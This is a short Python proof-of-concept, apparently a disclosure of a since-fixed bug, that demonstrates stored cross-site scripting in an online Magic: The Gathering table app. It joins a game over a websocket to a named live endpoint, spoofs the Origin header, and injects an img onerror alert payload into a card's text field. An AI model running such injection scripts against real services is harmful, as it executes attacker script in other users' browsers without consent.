# XSS Proof-of-Concept
# Fixed in 985feb2
# Researched/Developed by Matt Evans/cmdr0 - https://github.com/cmdr0

import asyncio, json, websockets

game_id = 'M26W'

def generate_state(inject):
  return json.dumps({
    "action":"sendstate",
    "message":{
      "gameid":game_id,
      "nextCardId":111,
      "nextPlayerId":3,
      "players":[
        {
          "graveyard":[],
          "cards":[],
          "is_monarch":False,
          "name":"Player One",
          "health":{"val":20},
          "id":1,
          "is_active_player":True
        },{
          "graveyard":[],
          "cards":[
            {
              "table_card_is_tapped":False,
              "oracle_text":"{T}: Target creature gains haste until end of turn. (It can attack and {T} this turn.)"+inject,
              "inGraveyard":False,
              "type_line":"Creature â Goblin Warrior",
              "color_identity":["R"],
              "related_uris":{
                "gatherer":"https://gatherer.wizards.com/Pages/Card/Details.aspx?multiverseid=447279"
              },
              "image_uris":{
                "png":"https://c1.scryfall.com/file/scryfall-cards/png/front/9/4/94b3a4fb-9024-45ef-a54b-cf3a9fa5b9c2.png?1562303343",
                "small":"https://c1.scryfall.com/file/scryfall-cards/small/front/9/4/94b3a4fb-9024-45ef-a54b-cf3a9fa5b9c2.jpg?1562303343",
                "art_crop":"https://c1.scryfall.com/file/scryfall-cards/art_crop/front/9/4/94b3a4fb-9024-45ef-a54b-cf3a9fa5b9c2.jpg?1562303343"
              },
              "table_card_counter":{"val":0},
              "flavor_text":"Small words stoke large flames.",
              "table_card_id":110,
              "drag_type":"card",
              "mana_cost":"{R}",
              "name":"Goblin Motivator",
              "tokens":[
                {"name": "Garbageroth"}
              ],
              "power":"1",
              "toughness":"1",
              "table_card_show_counter":False
            }
          ],
          "is_monarch":False,
          "name":"Player Two",
          "health":{"val":20},
          "id":2,
          "is_active_player":False
        }
      ]
    }
  })

def generate_malstate():
  # inject = '<script>alert("1")</script>'
  inject = '<img src="notanimage.png" onerror="alert(\'1\')"></img>'
  return generate_state(inject)

async def handle(uri):
  async with websockets.connect(
    uri, 
    extra_headers=[("Origin", "https://mtgvirtualtable.fischco.org")],
    ssl=True
  ) as ws:
    await ws.send(json.dumps({
      'action': 'join',
      'message': game_id
    }))
    resp = await ws.recv()
    print(resp)
    await ws.send(generate_malstate())
    resp = await ws.recv()
    print(resp)

asyncio.get_event_loop().run_until_complete(handle('wss://5mz965txnl.execute-api.us-west-2.amazonaws.com/dev'))